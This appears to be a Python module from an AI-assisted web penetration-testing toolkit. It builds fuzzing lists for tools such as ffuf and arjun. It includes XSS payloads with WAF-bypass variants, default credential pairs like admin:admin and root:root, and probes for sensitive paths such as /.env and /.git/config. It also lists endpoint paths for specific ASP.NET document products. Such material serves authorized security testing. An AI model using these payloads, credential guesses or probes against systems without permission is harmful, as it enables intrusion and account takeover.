"""Single-shot mutation lists — GetAIResult, not a Joshua ReAct loop.

XSS bypasses, path permutations, param names, password candidates. One call,
a numbered list, then ferox/arjun/curl consume it.
"""

from __future__ import annotations

import re
from typing import Any, Dict, Iterable, List, Optional
from urllib.parse import urlparse

KINDS = ("paths", "params", "xss", "passwords", "subdomains")

_PATH_SEEDS = [
    "/api", "/api/v1", "/api/v2", "/graphql", "/admin", "/login", "/actuator",
    "/swagger.json", "/openapi.json", "/api-docs", "/.git/config", "/robots.txt",
    "/sitemap.xml", "/health", "/ready", "/status", "/debug", "/internal",
    "/actions", "/execute", "/datasource", "/webhook", "/proxy", "/import",
    "/export", "/upload", "/console", "/manager", "/phpinfo.php", "/server-status",
    "/.env", "/config.json", "/api/actions/execute", "/api/v1/actions/execute",
]
_ASPNET_API_PATHS = [
    "/api/Settings/SaveSettings",
    "/api/Settings/GetSettings",
    "/api/TaskAdmin/UpdateTask",
    "/api/TaskAdmin/GetAllUserTasks",
    "/api/LogQuery/QueryLog",
    "/api/Audit/WriteAudit",
    "/api/ReadTasks/GetTaskCardHtml",
    "/api/OpenDocument/Open",
    "/api/Metadata/ValidMediaTypes",
    "/api/DocumentCentre",
]
_PARAM_SEEDS = [
    "url", "uri", "redirect", "next", "callback", "returnUrl", "dest", "target",
    "webhook", "proxy", "fetch", "requestUrl", "datasource", "query", "q",
    "id", "user_id", "account_id", "file", "path", "template", "expr",
    "cmd", "exec", "action", "source", "endpoint",
]
_XSS_SEEDS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'-alert(1)-'",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<details open ontoggle=alert(1)>",
    "{{constructor.constructor('alert(1)')()}}",
    "<iframe src=javascript:alert(1)>",
    "';alert(1)//",
]
_PASSWORD_SEEDS = [
    "admin", "admin:admin", "admin:password", "admin:Password1",
    "test:test", "guest:guest", "root:root", "user:user",
]


def generate_mutations(
    kind: str,
    observed: str = "",
    *,
    count: int = 30,
    extra: Optional[Iterable[str]] = None,
) -> Dict[str, Any]:
    kind = (kind or "paths").strip().lower()
    if kind not in KINDS:
        return {"ok": False, "error": f"kind must be one of {KINDS}"}
    count = max(5, min(int(count or 30), 60))
    observed = observed or ""
    items = _from_observed(kind, observed)
    items.extend(extra or [])
    items.extend(_seeds(kind, observed))
    uniq: List[str] = []
    seen = set()
    for raw in items:
        text = str(raw or "").strip()
        if not text or text in seen:
            continue
        seen.add(text)
        uniq.append(text)
        if len(uniq) >= count:
            break
    return {
        "ok": True,
        "kind": kind,
        "count": len(uniq),
        "items": uniq,
        "source": "templates+observed",
        "note": (
            "Single-shot list. Feed paths to ferox/ffuf, params to arjun, "
            "XSS to mutate_captured_request / browser. Not a methodology loop."
        ),
    }


def _seeds(kind: str, observed: str) -> List[str]:
    blob = observed.lower()
    if kind == "paths":
        out = list(_PATH_SEEDS)
        host = _host(observed)
        if host:
            first = host.split(".")[0]
            out.extend([f"/{first}", f"/api/{first}", f"/{first}-api"])
        if "404" in blob or "not found" in blob:
            out.extend(["/app", "/dashboard", "/static", "/assets", "/_next"])
        if re.search(r"azurewebsites|asp\.net|aspnet|iis|/api/settings|doccentrum|docutrack", blob):
            out = list(_ASPNET_API_PATHS) + out
        return out
    if kind == "params":
        out = list(_PARAM_SEEDS)
        out.extend(_token_params(observed))
        return out
    if kind == "xss":
        out = list(_XSS_SEEDS)
        if "cloudflare" in blob or "akamai" in blob or "waf" in blob:
            out.extend([
                "<scr<script>ipt>alert(1)</script>",
                "<img src=x onerror=alert`1`>",
                "<svg/onload=alert(1)>",
            ])
        return out
    if kind == "passwords":
        return list(_PASSWORD_SEEDS)
    if kind == "subdomains":
        host = _host(observed)
        labels = ["dev", "staging", "api", "admin", "app", "test", "qa", "internal",
                  "vpn", "mail", "cdn", "docs", "status", "grafana", "kibana"]
        if host:
            return [f"{lab}.{host}" for lab in labels]
        return labels
    return []


def _from_observed(kind: str, observed: str) -> List[str]:
    if kind == "paths":
        found = re.findall(r"(?:https?://[^\s\"']+)?(/[a-zA-Z0-9._\-/~]{2,80})", observed)
        return found[:20]
    if kind == "params":
        return re.findall(r"[?&]([a-zA-Z_][a-zA-Z0-9_]{1,32})=", observed)[:20]
    if kind == "subdomains":
        return re.findall(r"\b([a-z0-9-]{2,40}\.[a-z0-9.-]{3,80})\b", observed.lower())[:10]
    return []


def _token_params(observed: str) -> List[str]:
    return [
        t for t in re.findall(r"\b([a-zA-Z_]{2,24}(?:Url|URI|Id|Token|Key)?)\b", observed)
        if t.lower() in {p.lower() for p in _PARAM_SEEDS} or t.lower().endswith(("url", "uri", "id"))
    ][:12]


def _host(observed: str) -> str:
    m = re.search(r"https?://([^/\\s\"']+)", observed)
    if m:
        return (urlparse("https://" + m.group(1)).hostname or "").lower()
    parsed = urlparse(observed if "://" in observed else "")
    return (parsed.hostname or "").lower()
